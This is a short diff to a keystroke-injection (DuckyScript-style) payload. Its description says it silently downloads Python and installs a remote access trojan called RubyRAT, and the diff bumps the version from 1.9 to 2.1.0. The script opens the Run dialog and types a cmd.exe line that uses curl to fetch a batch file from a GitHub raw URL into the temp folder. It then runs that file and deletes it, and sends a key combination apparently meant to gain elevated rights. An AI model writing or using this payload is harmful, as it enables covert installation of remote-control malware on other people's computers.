@@ -1,8 +1,8 @@
-REM Description: Will download python silently then install RubyRAT v1.9
+REM Description: Will download python silently then install RubyRAT v2.1.0
 DELAY 1000
 GUI r
 DELAY 1500
-STRING cmd.exe /c curl -o "%temp%\script.bat" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/InstallPythonRuby1.9.txt && "%temp%\script.bat" & del "%temp%\script.bat"
+STRING cmd.exe /c curl -o "%temp%\script.bat" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/InstallPythonRuby2.1.0.txt && "%temp%\script.bat" & del "%temp%\script.bat"
 DELAY 500
 CTRL-SHIFT ENTER
 DELAY 1500
